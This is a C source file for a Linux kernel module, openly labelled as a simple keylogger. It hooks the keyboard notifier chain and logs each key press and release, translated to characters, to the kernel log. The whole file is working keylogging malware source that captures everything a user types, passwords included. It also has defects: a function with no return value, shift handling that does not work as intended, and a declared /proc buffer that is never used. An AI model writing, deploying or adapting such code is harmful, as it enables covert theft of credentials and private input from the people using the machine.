#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>

#define PROCFS_MAX_SIZE		1024
#define PROCFS_NAME		"keylog1k"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tanner Hoelzel");
MODULE_DESCRIPTION("A simple keylogging module");

/*
 * A struct to hold information about the /proc file
 */
static struct proc_dir_entry *Keypress_Proc_File;

/*
 * A buffer to store characters for this module
 */
static char procfs_buffer[PROCFS_MAX_SIZE];

/*
 * The size of the buffer
 */
static unsigned long procfs_buffer_size = 0;

/*
 * A map where index represents keycode
 */
static const char* keymap[] =
	{	"ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9",
		"0", "-", "=", "BS", "TAB", "q", "w", "e", "r", "t",
		"y", "u", "i", "o", "p", "[", "]", "ENTER", "LCTRL", "a",
		"s", "d", "f", "g", "h", "j", "k", "l", ";", "'",
		"`", "LSHIFT", "\\", "z", "x", "c", "v", "b", "n", "m",
		",", ".", "/", "RSHIFT", "*", "LALT", " ", "CAPSLOCK", "F1", "F2",
		"F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLOCK",
		"HOME", "UP", "PGUP", "-", "LEFT", "5", "RTARROW", "+", "END", "DOWN",
		"PGDN", "INS", "DEL", "\0", "\0", "\0", "F11", "F12", "\0", "\0", 
		"\0", "\0", "\0", "\0", "\0", "RENTER", "RCTRL", "/", "PRTSCR", "RALT",
		"\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT",
		"DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE" };

/*
 * A map where index represents keycode
 */
static const char* keymapShift[] =
	{	"ESC", "!", "@", "#", "$", "%%", "^", "&", "*", "(",
		")", "_", "+", "BS", "TAB", "Q", "W", "E", "R", "T",
		"Y", "U", "I", "O", "P", "{", "}", "ENTER", "CTRL", "A",
		"S", "D", "F","G", "H", "J", "K", "L", ":", "\"",
		"~", "LSHIFT", "|", "Z", "X", "C", "V", "B", "N", "M",
		"<", ">","?", "RSHIFT", "*", "\0", " ", "CAPSLOCK", "_F1_", "_F2_",
		"_F3_", "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_",
		"_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5", "_RTARROW_", "+", "_END_", "_DOWN_",
		"_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_", "\0", "\0",
		"\0", "\0", "\0", "\0", "\0", "RENTER", "RCTRL", "/", "PRTSCR", "RALT",
		"\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT",
		"_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE" };

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	struct vc_data *vc = param->vc;

	int ret = NOTIFY_OK;

	int shift = (param->value == 42)||(param->value == 54);

	if(code == KBD_KEYCODE) {
		if(shift) {
			printk(KERN_INFO "KEYLOGGER %s %s\n", keymapShift[(param->value)-1], (param->down ? "down": "up"));
		} else {
			printk(KERN_INFO "KEYLOGGER %s %s\n", keymap[(param->value)-1], (param->down ? "down": "up"));
		}
	}
}

static struct notifier_block nb = {
	.notifier_call = hello_notify
};

static int __init keylogger_init(void)
{
	/* Register keylogger */
	register_keyboard_notifier(&nb);
	
	printk(KERN_INFO "Keyboard notifier registered");
	
	return 0;
}

static void __exit keylogger_cleanup(void)
{
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keyboard notifier unregistered\n");
}

module_init(keylogger_init);
module_exit(keylogger_cleanup);
